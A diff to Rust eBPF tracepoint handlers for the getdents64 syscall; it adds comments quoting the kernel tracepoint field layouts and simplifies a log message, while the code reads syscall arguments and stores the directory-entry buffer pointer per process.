@@ -65,9 +65,10 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
     }
 
     let pid = pid_tgid >> 32;
-    // field:unsigned int fd;  offset:16;      size:8; signed:0;
-    // field:struct linux_dirent64 * dirent;   offset:24;      size:8; signed:0;
-    // field:unsigned int count;       offset:32;      size:8; signed:0;
+    // cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/format
+    // field:unsigned int fd;                  offset:16; size:8; signed:0;
+    // field:struct linux_dirent64 * dirent;   offset:24; size:8; signed:0;
+    // field:unsigned int count;               offset:32; size:8; signed:0;
     let fd: u32 = unsafe { ctx.read_at(16).unwrap() };
     let buff_count: u32 = unsafe { ctx.read_at(32).unwrap() };
     info!(
@@ -77,15 +78,14 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
 
     let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
     map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();
-    info!(
-        &ctx,
-        "pid_tgid is {}, dirp is 0x{:x}", pid_tgid, dirp as u64
-    );
+    info!(&ctx, "dirp is 0x{:x}", dirp as u64);
     Ok(0)
 }
 
 #[tracepoint]
 fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
+    // cat /sys/kernel/debug/tracing/events/syscalls/sys_exit_getdents64/format
+    // field:long ret;                         offset:16; size:8; signed:1;
     let pid_tgid = bpf_get_current_pid_tgid();
     let total_bytes_read: i64 = unsafe { ctx.read_at(16).unwrap() };
     info!(&ctx, "total_bytes_read is {}", total_bytes_read);
